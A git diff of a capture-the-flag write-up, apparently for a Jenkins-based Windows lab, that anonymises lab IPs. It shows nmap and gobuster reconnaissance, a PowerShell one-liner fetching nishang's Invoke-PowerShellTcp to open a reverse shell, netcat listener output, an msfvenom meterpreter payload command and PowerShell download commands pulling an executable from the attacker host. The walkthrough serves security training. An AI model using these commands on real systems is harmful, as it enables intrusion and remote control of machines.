@@ -16,17 +16,18 @@ git clone https://github.com/samratashok/nishang
 Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.
 
 ### NMAP scan (no ping Pn): 
-```root@ip-10-49-106-177:~# nmap -sT -sC 10.49.135.47
+```
+# nmap -sT -sC <targetIP>
 Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-03 17:40 BST
 mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
 mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
 Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
 Nmap done: 1 IP address (0 hosts up) scanned in 4.36 seconds
-root@ip-10-49-106-177:~# nmap -sT -Pn -sC 10.49.135.47
+root@ip-<attackerIP> :~# nmap -sT -Pn -sC <targetIP>
 Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-03 17:41 BST
 mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
 mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
-Nmap scan report for 10.49.135.47
+Nmap scan report for  <targetIP>
 Host is up (0.00047s latency).
 Not shown: 997 filtered ports
 PORT     STATE SERVICE
@@ -42,7 +43,7 @@ PORT     STATE SERVICE
 |_http-title: Site doesn't have a title (text/html;charset=utf-8).
 
 Nmap done: 1 IP address (1 host up) scanned in 65.28 seconds
-root@ip-10-49-106-177:~# curl http://10.49.135.47:8080/robots.txt
+# curl http:// <targetIP>:8080/robots.txt
 # we don't want robots to click "build" links
 User-agent: *
 
@@ -84,7 +85,7 @@ X-Content-Type-Options: nosniff
 Set-Cookie: JSESSIONID.a7acbf59=node0culm1u2k46xraz96yxi7hhci19.node0;Path=/;HttpOnly
 Expires: Thu, 01 Jan 1970 00:00:00 GMT
 Set-Cookie: ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE=;Path=/;Expires=Thu, 01-Jan-1970 00:00:00 GMT;Max-Age=0;HttpOnly
-Location: http://10.49.152.15:8080/loginError
+Location: http://<targetIP>:8080/loginError
 Content-Length: 0
 Server: Jetty(9.4.z-SNAPSHOT
 ```
@@ -95,7 +96,7 @@ Date: Sun, 05 Apr 2026 11:42:46 GMT
 X-Content-Type-Options: nosniff
 Set-Cookie: JSESSIONID.a7acbf59=node01m7pxm70badb17albaatsn8v23.node0;Path=/;HttpOnly
 Expires: Thu, 01 Jan 1970 00:00:00 GMT
-Location: http://10.49.152.15:8080/
+Location: http://<targetIP>:8080/
 Content-Length: 0
 Server: Jetty(9.4.z-SNAPSHOT)
 ```
@@ -120,7 +121,7 @@ gobuster dir -u http://TARGET-IP -w /usr/share/seclists/Discovery/Web-Content/ra
 
 wordlist 800,000 long, target slows down never completing even with t 10, t 1 might work but target would time out. This was as good as it got. 
 
-gobuster dir -u http://10.48.136.91:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html -e -k --status-codes-blacklist 404,403,302,301>out5.txt
+gobuster dir -u http://<targetIP>:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html -e -k --status-codes-blacklist 404,403,302,301>out5.txt
 
 
 # cat out3.txt 
@@ -128,7 +129,7 @@ gobuster dir -u http://10.48.136.91:8080 -w /usr/share/wordlists/dirbuster/direc
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
-[+] Url:                     http://10.48.182.255:8080
+[+] Url:                     http://<targetIP>:8080
 [+] Method:                  GET
 [+] Threads:                 50
 [+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
@@ -140,10 +141,10 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 Starting gobuster in directory enumeration mode
 ===============================================================
-http://10.48.182.255:8080/robots.txt           (Status: 200) [Size: 71]
-http://10.48.182.255:8080/login                (Status: 200) [Size: 1942]
-http://10.48.182.255:8080/oops                 (Status: 500) [Size: 9389]
-http://10.48.182.255:8080/j_security_check     (Status: 303) [Size: 0] [--> http://10.48.182.255:8080/loginError]
+http://<targetIP>:8080/robots.txt           (Status: 200) [Size: 71]
+http://<targetIP>:8080/login                (Status: 200) [Size: 1942]
+http://<targetIP>:8080/oops                 (Status: 500) [Size: 9389]
+http://<targetIP>:8080/j_security_check     (Status: 303) [Size: 0] [--> http://<targetIP>:8080/loginError]
 
 ===============================================================
 Finished
@@ -153,8 +154,10 @@ nothing really usable.
 
 
 
-Q4: Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
-
+Q4: Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: 
+```
+powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
+```
 You first need to download the Powershell script and make it available for the server to download. You can do this by creating an http server with python: python3 -m http.server
 Answer: no response required.
 
@@ -164,8 +167,8 @@ Download, go to shells folder and start a python3 htt.server to allow download f
 root@ip-10-49-76-50:~# git clone https://github.com/samratashok/nishang
 Cloning into 'nishang'...
 ...
-root@ip-10-49-76-50:~# cd nishang/Shells
-root@ip-10-49-76-50:~/nishang/Shells# ls
+~# cd nishang/Shells
+~/nishang/Shells# ls
 Invoke-ConPtyShell.ps1               Invoke-PowerShellTcp.ps1
 Invoke-JSRatRegsvr.ps1               Invoke-PowerShellUdpOneLine.ps1
 Invoke-JSRatRundll.ps1               Invoke-PowerShellUdp.ps1
@@ -174,16 +177,17 @@ Invoke-PoshRatHttps.ps1              Invoke-PsGcatAgent.ps1
 Invoke-PowerShellIcmp.ps1            Invoke-PsGcat.ps1
 Invoke-PowerShellTcpOneLineBind.ps1  Remove-PoshRat.ps1
 Invoke-PowerShellTcpOneLine.ps1
-root@ip-10-49-76-50:~/nishang/Shells# python3 -m http.server 8000
+
+:~/nishang/Shells# python3 -m http.server 8000
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-10.49.152.15 - - [05/Apr/2026 13:03:02] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
+<targetIP> - - [05/Apr/2026 13:03:02] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
 
 File downloaded successfully.
 ```
 ```
-oot@ip-10-49-76-50:~/nishang/Shells# nc -lnvp 4443
+~/nishang/Shells# nc -lnvp 4443
 Listening on 0.0.0.0 4443
-Connection received on 10.49.152.15 49370
+Connection received on <targetIP> 49370
 Windows PowerShell running as user bruce on ALFRED
 Copyright (C) 2015 Microsoft Corporation. All rights reserved.
 
@@ -209,11 +213,13 @@ Another alternative was to use the “Manage Jenkins” option and then open the
 To make the privilege escalation easier, let's switch to a meterpreter shell using the following process.
 
 Use msfvenom to create a Windows meterpreter reverse shell using the following payload:
-
+```
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe
-
+```
 So starters quick reverse shell back in using groovy instead it appears easier, here is one link for a classic groovy reverse shell:
+```
 https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy
+```
 Its the same as reverse shell rom revshells.com, except String cmd="sh" is String cmd="cmd.exe" and of course change ip and port as normal.
 
 This method of reverse shell is terribly unstable. The other issue is that CMD shell does not support copying by port number so 
@@ -222,7 +228,7 @@ copy //ip/folder/file file
 ```
 wont work no matter what port. Powershell has the invoke-webrequest command, SMB does not support ports, 445 wont work here. Using powershell command from cmd shell wont work either: 
 ```
-powershell -command "Invoke-WebRequest -Uri http://10.48.107.215:8000/shell-name.exe -OutFile shell-name.exe"
+powershell -command "Invoke-WebRequest -Uri http://<attackerIP>:8000/shell-name.exe -OutFile shell-name.exe"
 ```
 Here’s the key point:
 - CMD can launch PowerShell
@@ -239,8 +245,8 @@ This is usually due to:
 So here I am back to nishang for this task.
 
 reset the reverse shell. 
-- Uploaded payload with python3 -m http.server.
-- Downloaded using:
+- Uploaded new payload with python3 -m http.server.
+- Downloadto using:
 ```
-powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.48.107.215:8000/shell-name.exe','shell-name.exe')"
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://<attackerIP>:8000/shell-name.exe','shell-name.exe')"
 ```
